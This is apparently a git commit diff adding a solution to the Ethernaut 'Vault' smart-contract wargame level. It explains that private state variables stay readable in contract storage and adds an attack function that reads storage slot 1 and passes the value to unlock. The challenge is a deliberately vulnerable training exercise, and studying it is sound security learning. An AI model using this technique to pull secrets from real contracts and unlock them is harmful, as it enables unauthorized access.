6532de794621290d406d7d0c53e232a2c5dfd4e3
furkankatepe01 <7.furkanaktepe@gmail.com>
2023-04-27 00:02:41 -0400

    .

--- Ethernaut/Vault/Solution.js
+++ Ethernaut/Vault/Solution.js
@@ -1,14 +1,19 @@
 /**
 
-Fallback
+Vault
  
-Vulnerability: 
+Vulnerability:
+Accessibility of Private State Variables
 
 Preventative Techniques:
-
+Do not store sensitive data on-chain
+Private access modifier is used for restricting direct access
+But the data is publicly avaliable on the storage of the contract
 */
 
 const attack = async (contract) => {
 
-    
+    const password = await web3.eth.getStorageAt(contract.address, 1);
+
+    await contract.unlock(password);
 }
